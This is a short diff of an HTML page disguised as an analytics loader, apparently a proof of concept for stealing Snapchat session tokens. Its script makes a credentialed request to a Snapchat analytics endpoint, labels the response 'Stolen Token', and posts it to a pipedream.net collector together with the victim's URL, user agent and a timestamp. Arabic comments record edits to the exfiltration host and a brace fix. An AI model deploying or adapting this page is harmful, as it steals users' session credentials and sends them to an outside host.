@@ -6,7 +6,7 @@
 <body>
     <h1>Loading your analytics...</h1>
 
-   <script>
+  <script>
         fetch('https://us-central1-gcp.api.snapchat.com/web-analytics/web/init_client', {
             method: 'POST',
             credentials: 'include',
@@ -19,21 +19,24 @@
         .then(response => response.json())
         .then(data => {
             console.log("Stolen Token:", data);
-
-            // استبدل localhost برابط RequestBin أو ngrok
-            fetch('https://eoegsy3lrhynxxw.m.pipedream.net', {
+            
+            // بداية fetch الثانية
+            fetch('https://eofg26yngr9vk6x.m.pipedream.net', {
                 method: 'POST',
-                mode: 'no-cors', // 'no-cors' is correct here for sending to a different domain
+                mode: 'no-cors',
                 headers: {
-                  'Content-Type': 'application/json'
+                    'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
                     stolen_token: data,
-                    victim: "User visiting github.snappublisher.snapchat.com",
-                    origin: window.location.origin
+                    victim_url: window.location.href,
+                    user_agent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
                 })
-            });
-        })
+            }); // نهاية fetch الثانية
+            // لا توجد } زائدة هنا
+          
+        }) // هذه تغلق then الثانية
         .catch(error => console.error('Error:', error));
 </script>
 </body>
